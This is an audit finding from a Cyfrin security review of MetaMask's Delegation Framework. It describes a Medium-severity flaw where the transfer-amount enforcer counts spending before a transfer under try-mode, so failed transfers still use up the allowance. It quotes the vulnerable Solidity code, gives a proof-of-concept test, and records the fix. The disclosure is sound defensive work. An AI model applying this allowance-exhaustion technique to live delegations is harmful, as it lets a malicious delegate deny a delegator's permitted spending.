---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-03-18-cyfrin-metamask-delegationframework1-v2-0-1-0
ingested_at: '2026-08-09T05:32:30Z'
protocol_category: []
published_at: '2025-03-18T00:00:00Z'
related_swc: []
severity: Medium
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md
tags:
- firm:cyfrin
- report:2025-03-18-cyfrin-metamask-delegationframework1-v2-0
title: Transfer Amount enforcer for ERC20 and Native transfers increase spend limit
  without checking actual transfers
vuln_class: []
---

# Transfer Amount enforcer for ERC20 and Native transfers increase spend limit without checking actual transfers

_Section severity (from Solodit section header): Medium_  
_Audit firm: Cyfrin_  
_Source report: [2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md)_

---

**Description:** Failed token/native transfers can potentially deplete a delegation's spending allowance when used with the `EXECTYPE_TRY` execution mode.

The issue occurs because the enforcer tracks spending limits by incrementing a counter in its `beforeHook`, before the actual token transfer occurs. In the `EXECTYPE_TRY` mode, if the token transfer fails, the execution continues without reverting, but the limit is still increased.

```solidity
function _validateAndIncrease(
    bytes calldata _terms,
    bytes calldata _executionCallData,
    bytes32 _delegationHash
)
    internal
    returns (uint256 limit_, uint256 spent_)
{
    // ... validation code ...

    //@audit This line increases the spent amount BEFORE the actual transfer happens
    spent_ = spentMap[msg.sender][_delegationHash] += uint256(bytes32(callData_[36:68]));
    require(spent_ <= limit_, "ERC20TransferAmountEnforcer:allowance-exceeded");
}

```

This means a malicious delegate could repeatedly attempt transfers that are designed to fail, draining the allowance without actually transferring any tokens.

**Impact:** This vulnerability allows an attacker to potentially exhaust a delegator's entire token transfer allowance without actually transferring any tokens

**Proof of Concept:**
```solidity
function test_transferFailsButSpentLimitIncreases() public {
        // Create a delegation from Alice to Bob with spending limits
        Caveat[] memory caveats = new Caveat[](3);

        // Allowed Targets Enforcer - allow only the token
        caveats[0] = Caveat({ enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(mockToken)), args: hex"" });

        // Allowed Methods Enforcer - allow only transfer
        caveats[1] =
            Caveat({ enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector), args: hex"" });

        // ERC20 Transfer Amount Enforcer - limit to TRANSFER_LIMIT tokens
        caveats[2] = Caveat({
            enforcer: address(transferAmountEnforcer),
            terms: abi.encodePacked(address(mockToken), uint256(TRANSFER_LIMIT)),
            args: hex""
        });

        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: hex""
        });

        // Sign the delegation
        delegation = signDelegation(users.alice, delegation);

        // First, verify the initial spent amount is 0
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);
        uint256 initialSpent = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
        assertEq(initialSpent, 0, "Initial spent should be 0");

        // Initial balances
        uint256 aliceInitialBalance = mockToken.balanceOf(address(users.alice.deleGator));
        uint256 bobInitialBalance = mockToken.balanceOf(address(users.bob.addr));
        console.log("Alice initial balance:", aliceInitialBalance / 1e18);
        console.log("Bob initial balance:", bobInitialBalance / 1e18);

        // Amount to transfer
        uint256 amountToTransfer = 500 ether;

        // Create the mode for try execution
        ModeCode tryExecuteMode = ModeLib.encode(CALLTYPE_SINGLE, EXECTYPE_TRY, MODE_DEFAULT, ModePayload.wrap(bytes22(0x00)));

        // First test successful transfer
        {
            // Make sure token transfers will succeed
            mockToken.setHaltTransfer(false);

            // Prepare transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(
                    IERC20.transfer.selector,
                    address(users.bob.addr), // Transfer to Bob's EOA
                    amountToTransfer
                )
            });

            // Execute the delegation with try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after successful transfer
            uint256 aliceBalanceAfterSuccess = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterSuccess = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after successful transfer:", aliceBalanceAfterSuccess / 1e18);
            console.log("Bob balance after successful transfer:", bobBalanceAfterSuccess / 1e18);

            // Check spent map was updated
            uint256 spentAfterSuccess = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
            console.log("Spent amount after successful transfer:", spentAfterSuccess / 1e18);
            assertEq(spentAfterSuccess, amountToTransfer, "Spent amount should be updated after successful transfer");

            // Verify the transfer actually occurred
            assertEq(aliceBalanceAfterSuccess, aliceInitialBalance - amountToTransfer);
            assertEq(bobBalanceAfterSuccess, bobInitialBalance + amountToTransfer);
        }

        // Now test failing transfer
        {
            // Make token transfers fail
            mockToken.setHaltTransfer(true);

            // Prepare failing transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(
                    IERC20.transfer.selector,
                    address(users.bob.addr), // Transfer to Bob's EOA
                    amountToTransfer
                )
            });

            // Execute the delegation with try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after failed transfer
            uint256 aliceBalanceAfterFailure = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterFailure = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after failed transfer:", aliceBalanceAfterFailure / 1e18);
            console.log("Bob balance after failed transfer:", bobBalanceAfterFailure / 1e18);

            // Check spent map after failed transfer
            uint256 spentAfterFailure = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
            console.log("Spent amount after failed transfer:", spentAfterFailure / 1e18);

            // THE KEY TEST: The spent amount increased even though the transfer failed!
            assertEq(spentAfterFailure, amountToTransfer * 2, "Spent amount should increase even with failed transfer");

            // Verify tokens weren't actually transferred
            assertEq(aliceBalanceAfterFailure, aliceInitialBalance - amountToTransfer);
            assertEq(bobBalanceAfterFailure, bobInitialBalance + amountToTransfer);
        }
    }
```

**Recommended Mitigation:** Consider one of the following options:
1. Implement a post check in afterHook() with following steps
    - track the initial balance in beforeHook
    - track the actual balance in afterHook
    - only update spend limit based on actual - initial -> in the afterHook

2. Alternatively, enforce `TransferAmountEnforcers` to be of execution type `EXECTYPE_DEFAULT` only,

**Metamask:** Fixed in commit [cdd39c6](https://github.com/MetaMask/delegation-framework/commit/cdd39c62d65436da0d97bff53a7a5714a3505453)

**Cyfrin:** Resolved. Restricted execution type to only `EXECTYPE_DEFAULT`
